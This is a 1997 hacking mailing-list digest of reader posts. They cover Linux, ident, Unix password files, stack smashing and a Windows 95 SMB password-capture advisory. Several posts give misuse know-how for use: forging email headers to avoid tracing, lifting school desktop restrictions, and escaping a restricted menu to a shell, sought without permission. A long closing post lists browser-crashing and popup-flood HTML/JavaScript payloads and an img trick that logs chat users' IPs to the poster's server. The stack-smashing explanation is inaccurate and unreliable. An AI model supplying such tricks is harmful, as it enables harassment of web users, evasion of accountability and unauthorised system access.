@@ -1,0 +1,748 @@
+Happy Hacker Digest March 23-24 1997 
+====================================================================== 
+      This is a moderated list for discussions of *legal* hacking. 
+               Moderators: Carolyn Meinel and Matt Hinze
+                 
+            OR to the Hackers forum: http://www.infowar.com 
+Digest archives are held under the "New" button at the Infowar site
+
+               Please don't send us anything you wouldn't 
+              email to your friendly neighborhood narc, OK?
+
+        To subscribe or 
+unsubscribe, use the subscribe boxes on the menu bars, please.. 
+If you decide you just want to use the forum and not get these 
+mailings, we promise our feelings won't get hurt if you unsubscribe 
+from this list.
+
+                       H a p p y  h a c k i n g !
+
+Table of Contents: 
+   o Linux Questions 
+   o Faking Email Headers 
+   o Identd? 
+   o Understanding Unix 
+   o Stack Busting 
+   o Windows Hacking 
+   o More MSIE Problems 
+   o Jinxing Web Browsers
+
+================================================================= 
+   *** Linux Questions 
+=================================================================
+
+   a friend and i discovered something. We were both in our linux 
+   and when i tried doing a finger, I'll show up with all the 
+   other users, but him. But if I did a who he will be on !!!. We 
+   use a Red Hat Linux release 4.0 (Colgate) Kernel 2.0.18, is 
+   this a bug ???  an exploit???  his login is rmartinez and by 
+   using who we'll see rmartinez if we finger 
+   rmartinez@blah.blah.blah we=B4ll see all his description 
+   apparently someone told us it was due to the fact that his 
+   username was too long so he could be authenticated but that 
+   linux won't consider it as a user.
+
+   Can we get anything useful from this??
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+>From "prata@boss1.bossnt.com" <prata@cyber-wizard.com>
+
+   | When i was interested in getting linux, i had the same problem. 
+   | I bought RedHat Linux Unleashed (from SAMS publishing). It is 
+   | bundled with a really nice linux cd that has plenty of stuff on 
+   | it to get you started. It also comes with LILO (read: "lie low"). 
+   | That's a boot system for linux that enables you to run multiple 
+   | OS's. 
+   | The book tells you how to set it all up. 
+   | 
+   | You're going to need to partition your drive. In order not to 
+   | erase your 95 stuff, you have to use FIPS or another partitioning 
+   | utility. The book explains this all in detail. The point? Get 
+   | yourself a linux book and cd and just follow the instructions.
+
+   (snip)
+
+   Ok.  I was using Slackware (kernel 1.2.3).  It did not have a 
+   lot of the utilities that I wanted, such as pppd.  So I 
+   downloaded the full RedHat 4.0 distribution (about 80+ mb.) 
+   from Sunsite.  I downloaded the Root and Boot diskettes, and 
+   ran the installation.  I had a second partition set up. Half 
+   way thru the installation, I got a ton of error messages, so I 
+   shut down for the night.  When I tried to boot Windoze the 
+   next day to check my email, nobody home!!  (Redhat F***'d up 
+   my MBR!!)  I tried fdisk /mbr, but nothing worked.  I had to 
+   reinstall Windoze 95!  Fun!!  So, be careful !!
+
+   BACKUP!!
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+>From Technomancer <technomancer@netasia.net> (
+
+   Hello!
+
+   I have currently installed Slackware Linux at the office.  The 
+   installation went out fine but the problem I encountered was 
+   how am I going to connect to the internet and also to our LAN? 
+   I have used netconfig and IMHO, I was able to input the 
+   correct values.  Still if I try to ping our DNS, Linux says 
+   that the network is not reachable or something to that effect. 
+   I am using Ethernet 3Com 509 and I have another box using 
+   NE2000.  What should I do?  I've skimmed through Linux 
+   Unleashed and it assumes that we are connected properly.  I 
+   tried GNU Linux too but the same thing happens. Please help. 
+   Thanks in advance! :)
+
+================================================================= 
+   *** Faking Email Headers 
+=================================================================
+
+From: k1neTiK <samk5@IDT.NET>
+
+   Subject: Email answers
+
+   This is quite a long post, be warned. 
+   disclaimer: 
+   By reading this you are agreeing to the following: 
+   Any damage done to yourself with a large hammer is not 
+   k1neTiK's responsibility, nor will he particularly care.
+
+   >Ed's note: 
+   > 
+   >   You can't really cover your tracks in email. Your email header 
+   >   records the entire path it travels, all the way from the modem 
+   >   port you were logged on. Your sysadmin can check the logs and 
+   >   point you out. Of course, if you're really desperate, you can 
+   >   always hack into another account (dangerous!) and spoof that. 
+   >   There is another method, using web email and anonymizer.com but I 
+   >   haven't really checked if that is truly anonymous. I know of one 
+   >   instance that we need to make anonymous postings, e.g., you 
+   >   disagree with an opinion but are afraid to receive a 
+   >   violent/virulent retaliation from other parties.
+
+   Covering your tracks becomes very easy with experience. 
+   Headers can be faked, just after typing DATA type the header 
+   info you want, and the real header will be added onto that. 
+   If your DNS is username@domain.com as opposed to 
+   username@ts-12.ppp-56.nyc.domain.com or something then it 
+   becomes much easier.  It even HELPS you to go to a computer 
+   that is running Ident. All you have to do is download an Ident 
+   Daemon, or use mIRC's, change your username to root in the 
+   daemon, and send the fakemail.
+
+   Tips for sending fakemail: 
+   1. Use a big server, so it is harder to look at the logs. 
+   2. Fake the header, so that they can't trace your IP without 
+      great difficulty (it is much easier for someone to look at 
+      the first IP in the header, and trace that, then go through 
+      all the IPs in the header and trace all of them. ) it helps 
+      to use real domains and IPs. 
+   3. Fake Ident. 
+   4. Make sure it doesn't say "apparently from and apparently to" by 
+         a) using a real domain 
+         b) typing "from:(whoever)" and "to:(whoever)" after faking the 
+         header (you 
+      can give anything in the "from:", but if you give an Email 
+      address as opposed to a name, make sure its the same as you 
+      wrote in the "rcpt to:"). 
+   5. Send yourself a copy first.
+
+   When my school would not let us get to the Dos prompt when we 
+   were logged into Novell, I turned to two of the hackers most 
+   important resources, improvisation and more experienced 
+   hackers.  Does your school/business restrict your access to 
+   the Dos Prompt?  I am going to put on my web page 
+   (http://www.geocities.com/TimesSquare/Arcade/4594) a list of 
+   different ways to get into the Dos Prompt even when access is 
+   restricted, send your ways to "samk5@idt.net" unless otherwise 
+   specified in your Email, I will give credit where credit is 
+   due.  A little taste of what's to come.
+
+   Your School/Business might have put certain restrictions on 
+   Windows which may shadow the RUN command and/or the NEW 
+   command, and may even remove the "file" menu completely.  My 
+   school had restricted access to everything besides removing 
+   the "file" menu, so of course, my first stop were the INI 
+   files.  Guess what I found?  Under Program.ini, there were two 
+   suspicious lines towards the bottom, which read:
+
+   editlevel=4 
+   norun=1
+
+   Usually in computer language 1 = true and 0 = false.  But the 
+   Editlevel was a different thing. I could have taken the easier 
+   way out and just put a colon in front of these lines, but I 
+   thought I would do something a little less conspicuous.  I 
+   changed "norun=1" to "norun=0" and "editlevel=4" to 
+   "editlevel=0" and lo and behold, next time I booted Windows it 
+   gave me all the options.
+
+================================================================= 
+   *** Identd? 
+=================================================================
+
+From: "Crazy J" <crazyj@earthlink.net>
+
+   >When I am on mIRC once in a while I notice that I get this on my 
+   >server status window: *** Identd request from 207.155.184.71 *** 
+   >Identd replied: 1145, 25 : USERID : UNIX : fifo ..is it that the 
+   >system wants 2 kno whu I am?.. what duz 1145, 25 mean?.. thanks
+
+   First off under the identd tab you have show identd querys 
+   checked that's why you see that in the status window. Second if 
+   you want to know what it means and how it works you can read 
+   rfc1413 which outlines the Identification Protocol (Identd) 
+   and will tell you how it works and what it all means. Even so 
+   the 1145, 25 : USERID : UNIX : fifo  is the response to the 
+   server query 1145, 25, and means <port-on-server> , 
+   <port-on-client> : <resp-type> : <add-info>. You can do a 
+   search for rfc1413 or if you want I have a copy on my site at 
+   http://www.win.net/~cjc/fear/fear.html.
+
+   Later,
+
+         Crazy J
+
+================================================================= 
+   *** Understanding Unix 
+=================================================================
+
+From: jojo.hamilton@hamptons.com
+
+   In the March 9-12 HH, pete@servtech.com replied to a message with:
+
+         > the *s mean that the passwords are shadowed, for better 
+         > security. (There have been other posts on that subject, so I 
+         > won't grind it into the ground.)
+
+   I reply:
+
+   Actually, the *'s mean the username is not implemented. 
+   Characters such as "x" or "!" mean that the password is 
+   shadowed.
+
+   Also, I am on a system running System V Release 4, set up with 
+   a menu system, consisting of Pine, ftp, lynx, telnet, yadda 
+   yadda yadda..  Basically, there are no shell accounts, no ftp 
+   access..and shadowed passwords. They use an Annex Command Line 
+   Interpreter that, upon login, sometimes drops you out of their 
+   menu (before connecting to the system), and lets you view who 
+   is on the nodes, what jobs are running, and the IP addresses 
+   of servers...
+
+   My question is: how would one go about getting out of the menu 
+   system (ctrl-z is disabled within pine and others), and/or 
+   root..
+
+techmafia speaks: 
+  
+   There are two ways to do this.  First, create a file that 
+   contains the following:
+
+   #!/bin/sh 
+   /usr/local/bin/tcsh
+
+   FTP it to your site, call it 'blah', make sure it is 
+   executable, (chmod +x blah  [from FTP if you cannot do it 
+   from a shell or a program available to you]), and then set 
+   your external editor to that.  Then when you run your external 
+   editor, BOOM.  You get a shell.
+
+   As for root: get the shell first.  Then there are billions of 
+   ways to gain root.  Start surfing the net and look for new 
+   exploits.
+
+techmafia falls silent.
+
+   "Do you have written permission to break into..blah.." "No" I just 
+   want to do it for the sheer thrill of it, besides, why would I down a 
+   server that I depend on?
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+From: Timothy Ward <tbw@discordia.all-net.net>
+
+   Shadow questions:
+
+   Okie dokie. I've seen a lot of posts of late about shadowing, 
+   and not to deny anyone the information, but it's real 
+   annoying.  Shadowed system's are no fun. But even if you got 
+   the shadow'd file, chances are the people aren't lame and they 
+   have decent passwords.  (And even if they did use 'apple' for 
+   a password most likely it would probably be illegal to use it). 
+   So just as a little review:
+
+   consider this /etc/passwd entry:
+
+   root:ASisSDiejSmLOi:0:0:Charlie &:/root:/bin/bash 
+   ^^ <-- normal entry. Encrypted password stored along with everything 
+   else.
+
+   Now, consider this one.
+
+   root:*:0:0:Charlie &:/root:/bin/bash <--
+
+   the * on a non shadowed system would disable the account whereas a * 
+   on a shadowed system means the encrypted password is stored somewhere 
+   else the accompanying shadow file looks like this:
+
+   root:$1$WmBaRBqP$3fX5EsK78uRaU5PQE4nbh.:0:0::0:0:Charlie 
+   &:/root:/bin/bash
+
+   isn't life grand??
+
+   As for the pwd.db a strings on the file yields :
+
+   prozac 
+   Brad Huges 
+   /home/prozac 
+   /bin/bash 
+   1prozacdiscord 
+   Discordia Login 
+   /home/discord 
+   /bin/bash 
+   discord 
+   Discordia Login 
+   /home/discord 
+   /bin/bash 
+   ...
+
+   So as we can see its user information.. 
+ 
+
+   I hope this helps a lil..
+
+================================================================= 
+   *** Stack Busting 
+=================================================================
+
+From: bbuster@succeed.net (Bronc Buster)
+
+   Stacks Dumps (aka Smashing the Stack)
+
+   How do people write code that makes some normal Unix program 
+   crash and drop to a root shell? Most of this type of hacking 
+   is done with what, I'm sure a lot of you know, is called a 
+   "Stack Dump", or Smashing the Stack. Well what does this mean? 
+   Well I'm going to attempt to get you a "crash" course in Data 
+   Segments and Dynamic Memory Allocation. I know it sounds 
+   complex and some of you are already scrolling down, but I'm 
+   going to try, as usual, and put it into layman's terms.
+
+   All computers that run an Intel 80x86, or Intel based 
+   microprocessor (Pentiums, AMD, Cyrex) divide memory into 
+   things called "segments".  These segments are of diffrent 
+   sizes depending on how each program was programmed, and how 
+   each allocates memory. There are Large, Medimum and Small 
+   "memory models", as they are called. For the sake of this I'm 
+   going to use the "Small memory model" which has 65,536 bytes 
+   allocated for the programs use. To get a better picture of 
+   what a Data Segment looks I'm making a diagram of a "Small 
+   memory model Data segment"
+
+                   /-|-----------------| <- 65,535 bytes 
+                   | |                 | 
+           Stack - | |                 | 
+                   \-|-----------------| <- Movable Boundry 
+                   / |                 | 
+                   | |                 | 
+           Heap -  | |                 | 
+                   | |                 | 
+                   \-|-----------------| <- Non-Movable Boundry 
+                   / |                 | 
+                   | |                 | 
+          Static - | |                 | 
+                   \-|-----------------| <- 0 bytes
+
+   Let's start at the bottem and work up. The static area at the 
+   bottom is for external and static variables. This is of a 
+   preset size before the program is run because most of these 
+   values are preset in the program.  This area holds basic 
+   values and other items that remain through out the run of the 
+   program and remain constent. The boundry above it is 
+   Non-movable because of it's preset size.
+
+   The Heap, or Near Heap is all the memory between the Static 
+   and Stack area. This is the area the programs runs in. The 
+   program uses this area and manages it assigning pieces of it 
+   to sub-functions and other parts of the program as needed. 
+   This is called "Dynamic Memory Allocation". The Heap will 
+   always be of diffrent sizes as the Static area will, depending 
+   on its needs, start out bigger or smaller. The Stack also 
+   grows and shrinks moving it boundry and shrinking the Heap.
+
+   Now onto the Stack. As I have said above, the Heap's size is 
+   always diffrent depending on the preset Static area, and on 
+   the Stack. The Stack will grow and shrink depending on other 
+   variables. If a subfunction is called and has more variable 
+   that are just used in this subfuntion, they are stored in the 
+   Stack. For instance, if you get a prompt to enter some kind of 
+   information for a program, chances are a subfunction is asking 
+   for it, and it will be stored in the Stack until used; then 
+   the memory it used will be cleared and that information 
+   passed on, or deleted.
+
+   Now what if a large program was running, doing a lot of little 
+   things, and it asked you for a few lines of input. You input 
+   50,000 letters.  (This is a poor example but I'm trying to put 
+   it in simple terms.) Well if the program is not written 
+   correctly as to limit your input, you could "Crash the Stack". 
+   As the Heap gets bigger the boundry in between the Stack and 
+   itself moves up, then if the Stack needs some bit of memory it 
+   is forced to do with what little it has between the Heap 
+   boundry and the roof at 65,535 bytes. If it needs more memory 
+   and it is not available because it is all in use, it springs a 
+   leak, or "dumps" over the top , hence "Stack Dump". In Unix 
+   a lot of programs need to start a SUID process, or they need to 
+   "run as root" in order to do what they have to do. Now if one 
+   of these programs were to crash while this root process, or as 
+   it's really a root shell, was open, it would drop the person 
+   running it. If this shell were still open because the program 
+   never got a chance to exit from it, you would get dropped 
+   into it.
+
+   That's that..
+
+   I suggest if you want to learn more about Stack Dumps and 
+   hacking Unix in general you learn C. Unix is made for C, it's 
+   library functions are C, it's functions are C. Try going to a 
+   few sites that have codes (like mine) that exploit these types 
+   of holes and looking at what they do, and what they have in 
+   common that makes them work.
+
+   Can I get a .sig with this one? 
+ 
+
+   Regards                       \__ ^^ __/ 
+      BB                            X  X 
+                                    \  / 
+                                     \/ 
+  
+   -= One line AWK command that show users with no password or Superusers =- 
+   cat passwd | awk -F: 'NF !=7 || $3 == 0 || $2 == ""{printf $1 " " $2 " " $3}' 
+                           bbuster@succeed.net 
+                           bbuster@technophoria.com 
+                        http://www2.succeed.net/~bbuster 
+            www.infected.com - The Infected - Infecting young minds 
+            www.technophoria.com - Technophoria - We're confused?
+
+================================================================= 
+   *** Windows Hacking 
+=================================================================
+
+From: Steve Birnbaum <sbirn@NETMEDIA.NET.IL>
+
+See http://www.security.org.il/msnetbreak/ for more details.
+
+What's new
+
+   It is possible from anywhere on the Internet to obtain the 
+   cleartext Windows 95 login password from a Windows 95 computer on a 
+   network connected directly to the Internet given only the IP 
+   address and the workgroup and leave no trace of your actions. It is 
+   untested and may work with Windows For Workgroups as well.
+
+Description
+
+   There has been recent discussion on security mailing lists 
+   concerning the fact that Microsoft Internet Explorer running on 
+   Windows NT will automatically try to log in to a remote SMB server 
+   (file server) without prompting the user or without the user's 
+   knowledge. By design, the NT machine will transmit to this remote 
+   server the encrypted password and username of the user. This is 
+   documented by Aaron Spangler. The caveats with this are that the 
+   passwords are encrypted and that in many cases people do not use 
+   WWW browsers from NT servers, but rather from computers running 
+   Windows 95.
+
+   It has been explained that this same exploit does not work against 
+   Windows 95 because Windows 95 is only capable of accessing SMB 
+   shares (file sharing) if they are: 
+     * Connected to the same subnet. 
+     * In the Windows 95 computer's LMHOSTS file on startup 
+     * Announced to the Windows 95 computer by a Master Browser
+
+   It is this third and final condition that can be taken advantage of
+
+   to obtain the cleartext password and username of any Windows 95 
+   user who uses Microsoft Internet Explorer. Even careless use of 
+   Microsoft Network Neighborhood can exploit this hole without the 
+   requirement for Internet Explorer The requirements are knowledge of
+
+   the user's IP address, workgroup name and that they access a 
+   hostile web page. The first two are not difficult to obtain and the
+
+   third does not have to be an obscure page. In the last 6 months 
+   sites such as the CIA have been broken into. All it would require 
+   is that one un-noticeable line be added to the home page. Since the
+
+   viewable content of the page has not been altered, such a change 
+   can go unnoticed for a long time. 
+ 
+
+-- 
+Steve Birnbaum - System Administrator, NetMedia. Jerusalem, Israel. 
+sbirn@netmedia.net.il  Phone: +972-2-6795860   --Standard Disclaimer-- 
+sbirn@security.org.il  http://www.vix.com/spam/   (PGP key available)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+From: Anonymous
+
+In the beginner's series #2, Section 2.... about "hacking" windows 
+95... you said there are ways to hack windows 95 boxes over a network. 
+have a small LAN at home (and a big one at school <evil grin>) and 
+would like to test some of these things on my home and my school. I am 
+not trying to do things on my school network that are bad.... but... 
+It would be nice to know some of the ways to hack windows 95 boxes 
+over a LAN just in case some day it does come in handy. Also.... one 
+of my friends has a censorship prog on his computer that censors him 
+from EVERYTHING.... like... pages that contain the word "hack" are 
+even blocked out! it is b******t! Can you tell me a few more ways 
+to try just in case the ones you listed in the e-mag dont work?
+
+================================================================= 
+   *** More MSIE Problems 
+================================================================= 
+ 
+
+From: Steve Birnbaum <sbirn@NETMEDIA.NET.IL>
+
+Russ.Cooper@RC.ON.CA said: 
+> Is it more important to prevent MS boxes from automatically sending a 
+> challenge response transparently, or is it more important to have the 
+> challenge response mechanism fixed such that it cannot be exploited 
+> even if it is sent transparently and automatically?
+
+Very simply...both are important, both should be fixed and we should 
+ensure that CNN treats them equally.
+
+Since both methods can be used to break into remote computers, it is 
+picking at straws to say that one is more of a risk than the other.
+
+> removing functionality is less preferable to improving control over 
+> that functionality
+
+There is some "functionality" that Microsoft has provided that cannot 
+be secured.  If a feature can be secured, great.  If not, it should 
+not be there.  I do not consider the .url/etc problem fixed.  Browsers 
+should be making a much bigger deal about files from the network.  To 
+make the function to disable the warning as innocuous as making the 
+checkbox to make the helpful hints window not show up is not a good 
+solution. We are talking about serious risks.  I don't think that the 
+risk is being made apparent enough to the average windows user who is 
+going to disable every such checkbox by default.
+
+> A security management tool which could impose policies both locally 
+> and across the network would be able to do this for NT, but as yet we 
+> still have no program to do this. Why?
+
+I won't touch this one.  I think my opinions on it should be obvious.
+
+  Steve
+
+-- 
+Steve Birnbaum - System Administrator, NetMedia. Jerusalem, Israel. 
+sbirn@netmedia.net.il  Phone: +972-2-6795860   --Standard Disclaimer-- 
+"Windows NT: The lusers think it's pretty"  - buzz@warbeast.com 
+Boycott Internet Spam! http://www.vix.com/spam/   (PGP key available)
+
+================================================================= 
+ *** Jinxing Web Browsers (how to get punched in the nose -- CM:) 
+================================================================= 
+ 
+
+>From: GR8GUY <cyoung@northernnet.com>
+
+Here I've seen all this crap about this link and click here and open 
+up this file and so on ya know!! Or do this and it will close Netscape 
+or do this if you click here!! well heck..LAMERZ!!!  That file thing 
+is how I trace on the www chat lines! Don't tell anyone..I get a 
+server damaen then..cause the www chat allows pics I send them this 
+pic <img src="ftp://myip//C:\temp\trace.jpg"> then wham it logs them 
+to my server damean and I get their IP and whatever I want..but I 
+always boot them out of my drive after about 10 seconds....oh if they 
+want links..here I'm 17 and I can figure this stuff out...! 
+most of it is Java but it's some nasty Java! I like the password 
+one..put it on a homepage and call the link "Pamala Anderson" and all 
+the fools get their computer hijacked *grins*...I'm soo innocent!! HA HA 
+HA
+
+    ~Auto color with script prompt...
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="var xxx = 'teal'; 
+alert('Text');document.fgColor=xxx;document.bgColor='black';"></I><P>
+
+    ~Auto color...
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="var xxx = 
+'teal';document.fgColor=xxx;document.bgColor='black';"></I><P> 
+  
+  
+    ~Auto Opens window!
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="window.open('Address')">
+
+  
+    ~Auto Opens window(s)!  !!!!!Good one!!!!!
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="while(true){window.open( )}"> 
+ 
+
+    ~Auto Close Netscape
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="window.close( )"> 
+ 
+
+    ~Funny! " Blue light special "
+
+<img src="http://www.geocities.com/SiliconValley/7571/pi.gif" height=2 
+width=0 border=0 onLoad="var xxx = 'sky blue'; alert('Ok....Attention 
+K-Mart shoppers.. Blue light special!!!  Everything must 
+gooooo!!!!!!');document.fgColor=xxx;document.bgColor='blue';"></I><P>
+
+    ~Close Netscape...
+
+<a href=""onmouseover="window.close( )">TEXT</a>
+
+<a href=""onmouseover=parent.close()>TEXT</a>
+
+<input submit="window.close<Name>">
+
+    ~Opens window(s)!  !!!!!Good one!!!!! This will open about 30+ 
+Netscape Browsers, then they get scaped!
+
+<a href=""onmouseover="while(true){window.open( )}">TEXT</a> 
+ 
+
+    ~Opens 1 window...This will send them to the address you put in..
+
+<a href="" onmouseover="window.open('Address')">TEXT</a>
+
+    ~Color change with prompt...
+
+<a 
+href=""onmouseover="alert('Text');document.bgColor='brown'">TEXT</a>
+
+    ~Changes background color... Where it has ('white')  Type in any 
+color!
+
+<a 
+href="http://button."OnMouseOver="document.bgColor=('white')">TEXT</a>
+
+<a href="fttp://button"OnMouseOver="document.bgColor=('white')"<a 
+href=x)TEXT</a>
+
+<a href="http://button"OnMouseOver="document.bgColor=('white')"<a 
+href=x)TEXT</a>
+
+    ~Changes the font and background... With a prompt...
+
+<a href=""onmouseover="alert('Purple and beige?'); 
+document.bgColor=('beige'); document.fgColor=('purple')">TEXT</a>
+
+    ~This is another I have made... Just try it...And read what the 
+message says when it pops up...
+
+<a href="" onMouseOver="var fg =prompt('Text Color?', 'red');var 
+bg=prompt('Background 
+Color?','Black');document.fgColor=fg;document.bgColor=bg">TEXT</A></I><P>
+
+<a 
+href=""onmouseover="document.fgColor='teal';document.bgColor='black'">Text</ 
+A></I><P>
+
+    ~This will change the color to about 5 differnet times...One right 
+after the other...
+
+<a 
+href=""onmouseover="document.fgColor='White';document.bgColor='Black';docume 
+nt.fgColor='Red';document.bgColor='Yellow';document.fgColor='White';document 
+.bgColor='Black';document.fgColor='White';document.bgColor='Black';document. 
+fgColor='Red';document.bgColor='Yellow';document.fgColor='White';document.bg 
+Color='Black'">BLAZER</a>
+
+      ~This is the one that I made...  Where it has 'password'  Type 
+in anything you want! So if you type in 'Cool'  That will be the 
+password they have to enter to get out of the code.. This can scare 
+the crap out of people! *lol*
+
+<a href=""onMouseOver="var password = 'password';alert('Netscape is 
+about to crash! You have 5 chances to guess my password and not get 
+your pc jacked');var c = 0;while(c != 5) {var p =prompt('Guess');if(p 
+==password){c=5} else c ++};if(p == password){alert('You were Lucky 
+This time! But it only happens once!........you guessed.')}else 
+{alert('YOUR PC IS 
+JACKED!!');vaiCounter=0;while(true)window.open('http://www.NETural.com/~ccam 
+el')};"CRASHING"r+iCounter('width=1,height=1,resizable=no');iCounter++)}">TE 
+XT</a></I></I></I><P>
+
+                                  'password goes here' 
+ 
+
+    ~Looped Java...They can do nothing but click ok! Nasty code, I 
+like it! *lol*
+
+<a href=""onmouseover="while(true)(alert('Click ok'))">TEXT</a>
+
+<a href=""onmouseover=while(true)("document.bgcolor='COLOR'")>TEXT</a>
+
+    ~Java alerts...Type in a little message...It pops up, they click 
+ok and they are back to chatting...
+
+<a href=""onmouseover="window.alert('Text')">Text</A></I><P>
+
+<a href=""onMouseOver="alert ('Uh oh!!!  You should not have touched 
+this!!!') ;alert ('Ha Ha  made ya look!!! :0)') ;return 
+true;">Text</a></I><P>
+
+    ~This, you can have as many Java windows open as you want... Type 
+in your messages between the ('  ')  And, they just keep clicking ok 
+until the code ends...Depends on how many messages you put in...
+
+<a href=""onmouseover="alert('  '); alert('  '); alert('  '); alert(' 
+'); alert('  '); alert('  ')">Text</a>
+
+    ~Hmmm, made this one too! *lol*  This is a warning prompt...Try 
+it...
+
+<a href=""onmouseover="alert('Your screwed now!!!'); alert('Your one 
+stupid sucker arent ya!!!'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('Click ok?'); alert('Click ok?'); alert('Click ok?'); 
+alert('3'); alert('2'); alert('1'); alert('Next time it Wont stop! You 
+have been warned!!!')">Text</a>
+
+  GR8GUY 
+(LITTE BOY) 
+                        ?~----------------------------------~? 
+                        #  http://www.northernnet.com/cyoung # 
+                        #                                    # 
+                        #   power flows out of the beauty    # 
+                        #          of the baud               # 
+                        ?~----------------------------------~? 
+ 
+
+----------------------------------------------------------------------------- 
+Matt Hinze        <matt@cs.utexas.edu>    <- finger for phish tapelist 
+When they took the fourth amendment, I was quiet because I didn't deal drugs. 
+When they took the sixth amendment, I was quiet because I was innocent. 
+When they took the second amendment, I was quiet because I didn't own a gun. 
+Now they've taken the first amendment, and I can say nothing about it. 
+----------------------------------------------------------------------------- 
+Peter Beckman   techmafia 
+beckman@purplecow.com   http://www.purplecow.com/ 
+----------------------------------------------------------------------------- 
+Carolyn Meinel 
+M/B Research -- The Technology Brokers 
+-----------------------------------------------------------------------------
